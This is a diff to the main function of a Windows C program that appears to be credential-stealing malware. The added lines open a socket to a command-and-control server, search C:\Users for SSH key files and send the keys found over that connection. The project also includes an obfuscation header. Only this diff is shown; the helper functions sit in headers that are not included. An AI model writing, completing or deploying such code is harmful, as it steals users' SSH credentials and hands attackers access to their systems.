@@ -3,18 +3,26 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <winsock2.h>
 
 #include "find_ssh_key.h"
 #include "obfuscation.h"
-
-void hello(void) { printf("Hello World\n"); }
+#include "c2.h"
 
 int main(void) {
-  find_ssh_key(L"C:\\Users");
+  SetConsoleOutputCP(CP_UTF8);
 
-  char str[] = "BOFFE";
-  xor_str(str, strlen(str));
-  printf("%s", str);
+  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0,0};
+  DWORD32 lenKeysTab = 0;
+
+  SOCKET sock;
+  BOOL success = connect_to_c2(&sock);
+  if (success == 0){
+    exit(-1);
+  }
+
+  find_ssh_key(L"C:\\Users", keysFilenamesTab, &lenKeysTab);
+  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);
 
   return EXIT_SUCCESS;
 }
